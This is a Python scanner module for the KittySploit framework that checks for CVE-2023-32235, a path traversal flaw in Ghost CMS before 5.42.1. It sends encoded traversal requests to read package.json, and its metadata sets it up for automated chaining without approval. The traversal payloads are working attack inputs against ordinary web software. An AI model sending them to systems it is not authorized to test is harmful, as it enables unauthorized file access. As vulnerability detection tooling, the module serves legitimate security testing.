#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ghost before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ghost CMS < 5.42.1 - Path Traversal Detection',
        'description': "Ghost before 5.42.1 allows remote attackers to read arbitrary files within the active theme's folder via /assets/built%2F..%2F..%2F/ directory traversal. This occurs in frontend/web/middleware/static-theme.js.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'ghostcms', 'ghost', 'node.js', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-wf7x-fh6w-34r6',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-32235',
            'https://github.com/TryGhost/Ghost/commit/378dd913aa8d0fd0da29b0ffced8884579598b0f',
            'https://github.com/TryGhost/Ghost/compare/v5.42.0...v5.42.1',
        ],
        'cve': 'CVE-2023-32235',
    }

    def run(self):
        for path in ('/assets/built%2F..%2F..%2F/package.json', '/assets/built%2F..%2F..%2F%E0%A4%A/package.json'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('"name"', '"version"', '"ghost"',)
            header_any = ('application/json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Ghost CMS < 5.42.1 - Path Traversal detected",
                    path=path,
                )
                return True
        return False

